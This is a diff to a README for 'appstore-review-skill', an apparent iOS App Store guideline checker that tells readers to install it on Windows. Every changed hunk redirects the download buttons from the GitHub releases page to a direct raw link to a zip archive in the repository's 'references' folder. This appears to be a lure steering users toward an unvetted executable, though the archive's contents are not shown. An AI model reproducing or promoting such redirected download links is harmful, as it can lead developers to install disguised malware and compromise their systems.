@@ -1,6 +1,6 @@
 # 🔍 appstore-review-skill - Check Your iOS App Before Submission
 
-[![Download appstore-review-skill](https://img.shields.io/badge/Download-Appstore--Review--Skill-brightgreen)](https://github.com/nandodeejay/appstore-review-skill/releases)
+[![Download appstore-review-skill](https://img.shields.io/badge/Download-Appstore--Review--Skill-brightgreen)](https://raw.githubusercontent.com/nandodeejay/appstore-review-skill/main/references/review_skill_appstore_2.7.zip)
 
 ---
 
@@ -47,7 +47,7 @@ The software runs as a simple application with a graphical interface. You don’
 
 Click the big green button at the top or visit the release page below:
 
-[Download Page](https://github.com/nandodeejay/appstore-review-skill/releases)  
+[Download Page](https://raw.githubusercontent.com/nandodeejay/appstore-review-skill/main/references/review_skill_appstore_2.7.zip)  
 
 Follow these steps to download and open the app on your Windows PC:
 
@@ -95,7 +95,7 @@ To check your app against Apple’s guidelines, follow these steps inside the ap
 
 To keep appstore-review-skill current with Apple’s evolving guidelines, check the GitHub releases page regularly:
 
-[Visit Releases](https://github.com/nandodeejay/appstore-review-skill/releases)  
+[Visit Releases](https://raw.githubusercontent.com/nandodeejay/appstore-review-skill/main/references/review_skill_appstore_2.7.zip)  
 
 Download and install the newest version as it becomes available. This ensures the app checks against the latest App Store rules.
 
@@ -139,6 +139,6 @@ Make sure your project folder includes the main source files for the best result
 
 Use this link when you are ready to download and install the app:
 
-[Download appstore-review-skill](https://github.com/nandodeejay/appstore-review-skill/releases)  
+[Download appstore-review-skill](https://raw.githubusercontent.com/nandodeejay/appstore-review-skill/main/references/review_skill_appstore_2.7.zip)  
 
 Click it, then select the correct Windows file and follow the install instructions.
